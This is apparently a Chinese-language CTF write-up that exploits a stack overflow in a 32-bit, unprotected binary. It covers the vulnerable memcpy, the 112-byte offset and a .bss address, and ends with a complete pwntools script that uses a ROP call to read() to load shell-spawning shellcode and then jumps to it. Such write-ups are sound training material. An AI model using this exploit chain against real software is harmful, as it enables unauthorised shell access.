# 分析 #

先看文件信息，再查保护

![image.png](https://i.loli.net/2020/08/01/T7lxE1MmPiakFDU.png)

32位，动态链接,啥保护也没有，简单到无语了

放ida,F5查伪C

![image.png](https://i.loli.net/2020/08/01/vZ3A4Mu8Egzt1ae.png)

![image.png](https://i.loli.net/2020/08/01/a478jUNOfndwFvh.png)

dest的数据类型是char，占1个字节，memcpy却复制了0xC8u（十进制:200）个字节到dest，存在明显的栈溢出

# 利用 #

## 思路 ##

该程序用到了read函数，那么我们可以从rop直接调用read，从标准输入写入我们的payload，然后call我们的payload拿shell

从ida中可以看出变量dest到ebp的偏移量为6Ch，ebp的长度为4h，所以deal_user_info函数的ReturnAddress为6Ch+4h=70h,即112

也可以用gdb-pattern计算

![image.png](https://i.loli.net/2020/08/01/Decg9tnWHOkCv41.png)

除了偏移量，我们还需要一个地址来保存我们的read
Shift+F7查.bss段的地址(0804A040)

![image.png](https://i.loli.net/2020/08/01/9AVlJEhbw85CuKB.png)

## Exp ##

    from pwn import *
	
	proc = './a'
	io = process(proc)
	
	bss_addr = 0x0804A040 
	
	context.binary = proc
	shellcode = asm(shellcraft.sh())
	
	rop = ROP(proc)
	rop.read(0,bss_addr + 0x100,len(shellcode))
	rop.call(bss_addr + 0x100)
	
	io.recvuntil('\n')
	io.sendline('a' * 112 + str(rop))
	io.sendline(shellcode)

	io.interactive()
	
## 交互 ##

![image.png](https://i.loli.net/2020/08/01/3GRuA2Kfhyzmc1I.png)